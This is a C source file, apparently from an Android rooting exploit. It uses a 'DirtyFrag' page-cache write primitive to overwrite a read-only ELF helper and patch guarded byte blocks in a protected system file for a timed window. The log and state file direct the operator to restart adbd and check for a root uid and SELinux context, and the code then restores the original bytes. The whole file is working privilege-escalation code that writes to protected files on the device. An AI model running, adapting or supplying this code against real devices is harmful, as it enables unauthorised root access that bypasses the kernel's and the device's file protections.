#include "patch_window.h"

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "file_ops.h"
#include "payloads.h"

struct BridgeSession {
    const struct PatchTarget *target;
    int fd;
    char *helper;
    uint8_t *original;
    size_t length;
    int active;
};

struct PatchWindowSession {
    const struct PatchTarget *target;
    struct BridgeSession bridge;
    size_t applied;
    int bridge_initialized;
    int target_restored_exact;
    int bridge_restored_exact;
};

static int write_state(const char *path, const char *text) {
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    if (fd < 0) return -1;
    size_t length = strlen(text);
    size_t written = 0;
    while (written < length) {
        ssize_t count = write(fd, text + written, length - written);
        if (count <= 0) {
            close(fd);
            return -1;
        }
        written += (size_t)count;
    }
    int result = fsync(fd);
    close(fd);
    return result;
}

static void report_block(struct Reporter *reporter, const char *label,
                         size_t offset, const uint8_t bytes[16]) {
    REPORTLN("%s offset=0x%zx bytes="
             "%02x%02x%02x%02x%02x%02x%02x%02x"
             "%02x%02x%02x%02x%02x%02x%02x%02x",
             label, offset,
             bytes[0], bytes[1], bytes[2], bytes[3],
             bytes[4], bytes[5], bytes[6], bytes[7],
             bytes[8], bytes[9], bytes[10], bytes[11],
             bytes[12], bytes[13], bytes[14], bytes[15]);
}

static int bridge_prepare(struct DirtyFragWriter *writer,
                          struct BridgeSession *bridge,
                          const struct PatchTarget *target,
                          struct Reporter *reporter) {
    memset(bridge, 0, sizeof(*bridge));
    bridge->target = target;
    bridge->fd = -1;
    dirtyfrag_writer_set_paths(writer, target->bridge_path, target->target_path);

    bridge->helper = pad16(splice_helper_start,
            (size_t)(splice_helper_end - splice_helper_start), &bridge->length);
    bridge->fd = open(target->bridge_path, O_RDONLY | O_CLOEXEC);
    struct stat bridge_stat = {0};
    uint8_t digest[32];
    if (!bridge->helper || bridge->fd < 0
            || fstat(bridge->fd, &bridge_stat) != 0
            || bridge_stat.st_size != target->bridge_size
            || bridge->length > (size_t)bridge_stat.st_size
            || hash_file(target->bridge_path, digest) != 0
            || memcmp(digest, target->bridge_sha256, sizeof(digest)) != 0) {
        REPORTLN("bridge guard failed: path=%s size=%lld helper=%zu",
                 target->bridge_path,
                 (long long)(bridge->fd >= 0 ? bridge_stat.st_size : -1),
                 bridge->length);
        return -1;
    }
    bridge->original = malloc(bridge->length);
    if (!bridge->original
            || pread(bridge->fd, bridge->original, bridge->length, 0)
               != (ssize_t)bridge->length
            || memcmp(bridge->original, "\x7f" "ELF", 4) != 0) {
        REPORTLN("bridge guard failed: original prefix unavailable");
        return -1;
    }
    REPORTLN("bridge guard matched: path=%s size=%lld sha256=exact",
             target->bridge_path, (long long)target->bridge_size);
    return 0;
}

static int bridge_activate(struct DirtyFragWriter *writer,
                           struct BridgeSession *bridge,
                           struct Reporter *reporter) {
    if (bridge->active) return 0;
    /* A failed multi-block write may still have changed an earlier block. */
    bridge->active = 1;
    if (dirtyfrag_patch_file(writer, bridge->target->bridge_path,
                             bridge->helper, bridge->length,
                             0, 0, reporter) != 0) {
        REPORTLN("bridge activation incomplete: restoration required");
        return -1;
    }
    if (!file_span_matches(bridge->fd, 0,
                           bridge->helper, bridge->length)) {
        REPORTLN("bridge activation readback mismatch: restoration required");
        return -1;
    }
    REPORTLN("bridge state: active");
    return 0;
}

static int bridge_deactivate(struct DirtyFragWriter *writer,
                             struct BridgeSession *bridge,
                             struct Reporter *reporter) {
    int write_result = 0;
    if (bridge->active
            && dirtyfrag_patch_file(writer, bridge->target->bridge_path,
                    bridge->original, bridge->length, 0, 0, reporter) != 0)
        write_result = -1;
    if (bridge->fd >= 0) {
        close(bridge->fd);
        bridge->fd = -1;
    }
    drop_file_cache(bridge->target->bridge_path, reporter);
    bridge->fd = open(bridge->target->bridge_path, O_RDONLY | O_CLOEXEC);
    int exact = bridge->fd >= 0
        && file_span_matches(bridge->fd, 0, bridge->original, bridge->length);
    if (!exact) {
        REPORTLN("bridge restoration readback mismatch");
        return -1;
    }
    bridge->active = 0;
    REPORTLN("bridge state: restored_exact%s",
             write_result != 0 ? " (recovered by cache drop)" : "");
    return 0;
}

static void bridge_dispose(struct BridgeSession *bridge) {
    if (bridge->fd >= 0) close(bridge->fd);
    free(bridge->original);
    free(bridge->helper);
}

static int read_target_block(struct DirtyFragWriter *writer,
                             const struct PatchBlock *block,
                             uint8_t observed[16],
                             struct Reporter *reporter) {
    if (dirtyfrag_read_protected(writer, (off_t)block->offset,
                                 observed, reporter) != 0)
        return -1;
    report_block(reporter, block->purpose, block->offset, observed);
    return 0;
}

static int validate_target(struct DirtyFragWriter *writer,
                           const struct PatchTarget *target,
                           struct Reporter *reporter) {
    uint8_t observed[16];
    for (size_t i = 0; i < target->guard_count; i++) {
        const struct PatchBlock *block = &target->guards[i];
        if (read_target_block(writer, block, observed, reporter) != 0
                || memcmp(observed, block->original, sizeof(observed)) != 0) {
            REPORTLN("target %s rejected: exact guard %s mismatch",
                     target->id, block->purpose);
            report_block(reporter, "expected guard", block->offset,
                         block->original);
            REPORTLN("NEXT: confirm the protected file build ID and aligned bytes; do not reuse offsets from another build");
            return -1;
        }
    }
    for (size_t i = 0; i < target->patch_count; i++) {
        const struct PatchBlock *block = &target->patches[i];
        if (read_target_block(writer, block, observed, reporter) != 0
                || memcmp(observed, block->original, sizeof(observed)) != 0) {
            REPORTLN("target %s rejected: patch preimage %s mismatch",
                     target->id, block->purpose);
            report_block(reporter, "expected preimage", block->offset,
                         block->original);
            REPORTLN("NEXT: disassemble this exact build and derive a guarded replacement for the same semantic decision");
            return -1;
        }
    }
    if (dirtyfrag_read_protected(writer, target->target_size,
                                 observed, NULL) == 0) {
        REPORTLN("target %s rejected: protected file is larger than %lld bytes",
                 target->id, (long long)target->target_size);
        return -1;
    }
    REPORTLN("protected size guard matched: readable through 0x%llx, EOF at 0x%llx",
             (long long)(target->target_size - 16),
             (long long)target->target_size);
    REPORTLN("target guard matched: %s guards=%zu patches=%zu",
             target->id, target->guard_count, target->patch_count);
    return 0;
}

static int apply_target(struct DirtyFragWriter *writer,
                        const struct PatchTarget *target,
                        size_t *applied, struct Reporter *reporter) {
    uint8_t observed[16];
    *applied = 0;
    if (validate_target(writer, target, reporter) != 0) return -1;
    for (size_t i = 0; i < target->patch_count; i++) {
        const struct PatchBlock *block = &target->patches[i];
        *applied = i + 1;
        if (dirtyfrag_patch_file(writer, target->target_path,
                block->replacement, sizeof(block->replacement),
                block->offset, 1, reporter) != 0
                || read_target_block(writer, block, observed, reporter) != 0
                || memcmp(observed, block->replacement, sizeof(observed)) != 0) {
            REPORTLN("target patch failed: %s", block->purpose);
            return -1;
        }
        REPORTLN("target patch verified: %s", block->purpose);
    }
    return 0;
}

static int restore_target(struct DirtyFragWriter *writer,
                          const struct PatchTarget *target,
                          size_t applied, struct Reporter *reporter) {
    uint8_t observed[16];
    int result = 0;
    while (applied > 0) {
        const struct PatchBlock *block = &target->patches[--applied];
        if (dirtyfrag_patch_file(writer, target->target_path,
                block->original, sizeof(block->original),
                block->offset, 1, reporter) != 0
                || read_target_block(writer, block, observed, reporter) != 0
                || memcmp(observed, block->original, sizeof(observed)) != 0) {
            REPORTLN("target restoration failed: %s", block->purpose);
            result = -1;
        } else {
            REPORTLN("target restoration verified: %s", block->purpose);
        }
    }
    return result;
}

static void patch_window_init(struct PatchWindowSession *window,
                              const struct PatchTarget *target) {
    memset(window, 0, sizeof(*window));
    window->target = target;
    window->target_restored_exact = 1;
    window->bridge_restored_exact = 1;
}

static int patch_window_arm(struct DirtyFragWriter *writer,
                            struct PatchWindowSession *window,
                            struct Reporter *reporter) {
    window->bridge_initialized = 1;
    if (bridge_prepare(writer, &window->bridge,
                       window->target, reporter) != 0) return 1;
    window->bridge_restored_exact = 0;
    if (bridge_activate(writer, &window->bridge, reporter) != 0) return 2;
    int target_result = apply_target(writer, window->target,
                                     &window->applied, reporter);
    window->target_restored_exact = window->applied == 0;
    if (target_result != 0) return 3;
    if (bridge_deactivate(writer, &window->bridge, reporter) != 0) return 4;
    window->bridge_restored_exact = 1;
    return 0;
}

static int patch_window_restore(struct DirtyFragWriter *writer,
                                struct PatchWindowSession *window,
                                struct Reporter *reporter) {
    if (!window->bridge_initialized) return 0;
    int phase = 0;
    if (window->applied > 0 && !window->bridge.active) {
        if (bridge_activate(writer, &window->bridge, reporter) != 0)
            phase = 5;
        else
            window->bridge_restored_exact = 0;
    }
    if (window->applied > 0 && window->bridge.active) {
        int restore_result = restore_target(writer, window->target,
                                            window->applied, reporter);
        int drop_result = dirtyfrag_drop_protected_cache(writer, reporter);
        int verify_result = drop_result == 0
            ? validate_target(writer, window->target, reporter) : -1;
        if (drop_result != 0 || verify_result != 0) {
            phase = 6;
        } else {
            window->applied = 0;
            window->target_restored_exact = 1;
            if (restore_result != 0)
                REPORTLN("target state: restored_exact (recovered by cache drop)");
        }
    }
    if (window->bridge.active) {
        if (bridge_deactivate(writer, &window->bridge, reporter) != 0) {
            if (phase == 0) phase = 7;
        } else {
            window->bridge_restored_exact = 1;
        }
    }
    return phase;
}

int run_patch_window(struct DirtyFragWriter *writer,
                     const struct PatchTarget *target,
                     const char *state_path, int window_ms,
                     struct Reporter *reporter) {
    struct PatchWindowSession window;
    patch_window_init(&window, target);
    if (!state_path || !target || window_ms < 5000 || window_ms > 30000) {
        REPORTLN("patch window blocked: invalid parameters or no exact target");
        return 40;
    }

    char state[768];
    snprintf(state, sizeof(state),
             "state=arming\ntarget=%s\nkernel=%s\npath=%s\n"
             "guard_count=%zu\npatch_count=%zu\nroot_state=unverified\n",
             target->id, target->kernel_release, target->target_path,
             target->guard_count, target->patch_count);
    write_state(state_path, state);

    int result = 40;
    int arm_phase = patch_window_arm(writer, &window, reporter);
    if (arm_phase != 0) {
        result = 40 + arm_phase;
        goto cleanup;
    }

    snprintf(state, sizeof(state),
             "state=armed\ntarget=%s\nwindow_ms=%d\npath=%s\n"
             "patches=verified\nbridge=restored_exact\n"
             "next=restart_adbd_then_run_adb_shell_id_and_id_-Z\n"
             "root_state=unverified\n",
             target->id, window_ms, target->target_path);
    write_state(state_path, state);
    REPORTLN("patch window armed for %d ms", window_ms);
    REPORTLN("NEXT: restart adbd, then verify uid and SELinux context on the fresh connection");
    for (int elapsed = 0; elapsed < window_ms; elapsed += 50) usleep(50000);
    result = patch_window_restore(writer, &window, reporter) == 0 ? 10 : 48;

cleanup:;
    int cleanup_phase = patch_window_restore(writer, &window, reporter);
    if (cleanup_phase != 0) {
        REPORTLN("cleanup incomplete: phase=%d", cleanup_phase);
        result = 48;
    }
    int restored_exact = window.target_restored_exact
        && window.bridge_restored_exact;
    const char *state_name = result == 10 ? "restored"
        : restored_exact ? "failed_safe" : "failed_or_ambiguous";
    snprintf(state, sizeof(state),
             "state=%s\nresult=%d\ntarget=%s\n"
             "target_bytes=%s\nbridge=%s\nroot_state=%s\n",
             state_name, result, target->id,
             window.target_restored_exact ? "restored_exact" : "unverified",
             window.bridge_restored_exact ? "restored_exact" : "unverified",
             result == 10 ? "requires_fresh_adb_id_and_context_check"
                          : "unverified");
    write_state(state_path, state);
    if (window.bridge_initialized) bridge_dispose(&window.bridge);
    return result;
}
